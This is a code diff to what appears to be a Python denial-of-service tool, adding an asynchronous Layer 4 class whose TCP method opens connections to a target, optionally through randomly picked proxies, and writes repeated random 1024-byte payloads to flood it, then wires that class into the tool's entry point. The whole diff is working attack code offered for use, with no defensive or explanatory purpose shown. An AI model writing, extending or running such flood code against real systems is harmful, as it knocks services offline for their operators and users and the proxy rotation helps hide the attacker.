@@ -917,7 +917,7 @@ class AsyncHttpFlood(HttpFlood):
             )
         else:
             reader, writer = await asyncio.open_connection(
-                host=self._target.host, port=self._target.port, ssl=is_tls) 
+                host=self._target.host, port=self._target.port, ssl=is_tls)
         return reader, writer
 
     # XXX: config for timeouts
@@ -957,6 +957,49 @@ class AsyncHttpFlood(HttpFlood):
         return await self._generic_flood(payload)
 
 
+class AsyncLayer4(Layer4):
+
+    async def run(self) -> int:
+        return await self.SENT_FLOOD()
+
+    # note that TCP_NODELAY is set by default since Python3.6+
+    # XXX: for TCP only connection it should not be defined here,
+    #      as it's absolutely the same thing we do for L7
+    async def open_connection(
+        self,
+        conn_type=AF_INET,
+        sock_type=SOCK_STREAM,
+        proto_type=IPPROTO_TCP,
+    ) -> socket:
+        is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
+        if self._proxies:
+            proxy = self._proxies.pick_random()
+            reader, writer = await aiosocks.open_connection(
+                proxy=proxy,
+                proxy_auth=None,
+                dst=self._raw_target,
+                remote_resolve=False,
+                ssl=ctx if is_tls else None
+            )
+        else:
+            reader, writer = await asyncio.open_connection(
+                host=self._target.host, port=self._target.port, ssl=is_tls)
+        return reader, writer
+
+    async def TCP(self) -> int:
+        packets_sent, packet_size = 0, 1024
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        for _ in range(self._rpc):
+            payload: bytes = randbytes(packet_size)
+            writer.write(payload)
+            await asyncio.wait_for(writer.drain(), timeout=1)
+            self._stats.track(1, packet_size)
+            packets_sent += 1
+        writer.close()
+        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+        return packets_sent
+
+
 def async_main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
     if method not in Methods.ALL_METHODS:
         exit(f"Method {method} Not Found")
@@ -990,7 +1033,7 @@ def async_main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None
             if not ref:
                 exit("Empty Reflector File ")
 
-        return Layer4((ip, port), ref, method, event, proxies, stats)
+        return AsyncLayer4((ip, port), ref, method, event, proxies, stats)
 
 def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
     if method not in Methods.ALL_METHODS:
